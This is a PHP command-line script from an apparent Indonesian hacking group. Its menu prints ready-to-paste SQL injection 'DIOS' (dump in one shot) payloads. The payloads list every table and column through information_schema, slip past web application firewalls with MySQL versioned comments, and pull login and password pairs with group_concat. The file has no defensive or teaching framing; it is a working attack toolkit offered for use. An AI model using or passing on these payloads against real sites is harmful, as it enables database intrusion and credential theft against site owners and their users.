<?php 

echo "###################################################\n";
echo "#               Coded By : Micin                  #\n";
echo "#               WA:  081260341378                 #\n";
echo "#               Manusia Biasa Team                #\n";
echo "###################################################\n";
echo "1. Dios tampilan table\n";
echo "2. Dios Dump\n";
echo "3. Dios 403\n";
echo "4. Dump dios dari nomor satu\n";
echo "5. Dump dios 403\n";
sleep(2);
echo "Pilih : ";
$pil = trim(fgets(STDIN));
if ($pil == '1') {
	sleep(2);
	echo "Dios ==> (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)\n";
	exit();
} if ($pil == '2') {
	sleep(2);
	echo "Dios ==> make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n";
	exit();
} if ($pil == '3') {
	sleep(2);
	echo "Dios ==> /*!50000make_set*/(6,@:=0x0a,(select(1)/*!50000from*/(/*!50000information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!50000table_name*/,/*!50000column_name*/)),@)\n";
	exit();
} if ($pil == '4') {
	sleep(2);
	echo "Dios ==> group_concat(login,0x203a3a20,passwd)\n";
	exit();
} if ($pil == '5') {
	sleep(2);
	echo "Dios ==> export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)\n";
	exit();
} else {
	echo "Ketik yang bener anjg\n";
}

?>